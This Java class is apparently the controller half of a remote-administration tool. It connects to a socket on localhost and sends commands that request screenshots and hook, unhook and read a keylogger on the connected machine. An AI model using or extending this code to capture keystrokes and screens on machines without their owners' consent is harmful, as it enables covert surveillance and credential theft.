package model;

import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;

public class Client
{
    public Client()
    {
        initComponents();
    }

    private void initComponents()
    {
        //
    }

    public String createSocket()
    {
        try
        {
            sock = new Socket(InetAddress.getLocalHost(), 9999);

            inputStream = sock.getInputStream();
            outputStream = sock.getOutputStream();
            process = new Process(sock, inputStream, outputStream);
            application = new Application(sock,inputStream,outputStream);
        }
        catch (Exception e)
        {
            return e.toString();
        }

        return "Success";
    }

    public void setIP(String IP) {
        this.IP = IP;
    }

    public BufferedImage handleScreenShot(String command)
    {
        BufferedImage image = new BufferedImage(1, 1, 1);
        try
        {
            byte[] msg = command.getBytes();
            outputStream.write(msg);

            try
            {
                Thread.sleep(50);
            }
            catch (InterruptedException iE)
            {
                iE.printStackTrace();
            }

            byte[] imageAr = new byte[1920 * 1080];
            inputStream.read(imageAr);

            image = ImageIO.read(new ByteArrayInputStream(imageAr));
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }

        return image;
    }

    public String handleKeyLogger(String command)
    {
        try
        {
            byte[] msg = command.getBytes();
            outputStream.write(msg);

            switch(command)
            {
                case "Hook":
                    isHook = true;
                    break;
                case "Unhook":
                    isHook = false;
                    break;
                case "Print":
                    if (isHook)
                    {
                        byte[] buffer = new byte[5 * 1024];
                        inputStream.read(buffer);
                        String out = new String(buffer);
                        out = out.trim();
                        return out;
                    }

                    return "";
            }
        }
        catch (IOException ioE)
        {
            ioE.printStackTrace();
        }

        return "";
    }

    public Process getProcess() {
        return process;
    }

    public Application getApplication(){return application;}

//    public void handleApp(String command)
//    {
//        try
//        {
//            sock.setSoTimeout(1500);
//            byte[] msg = command.getBytes();
//            outputStream.write(msg);
//
//            if (command.equals("ListApp"))
//            {
//                byte[] buffer = new byte[1024];
//                inputStream.read(buffer);
//                String infoLine = new String(buffer, StandardCharsets.UTF_8);
//                System.out.println("vcvc");
//                while (true)
//                {
//                    inputStream.read(buffer);
//                    infoLine = new String(buffer, StandardCharsets.UTF_8);
//                    infoLine = infoLine.trim();
//
//                    ArrayList<String> tempArray = new ArrayList<>();
//                    System.out.println(infoLine);
//                }
//            }
//        }
//        catch (IOException ioE)
//        {
//            //
//        }
//    }

    public void sendCommand(String command)
    {
        try
        {
            byte[] msg = command.getBytes();
            outputStream.write(msg);
        }
        catch (IOException ioE)
        {
            //
        }
    }

    private Boolean isHook = false;
    private Socket sock;
    private String IP;
    private InputStream inputStream;
    private OutputStream outputStream;
    private Process process;
    private Application application;
}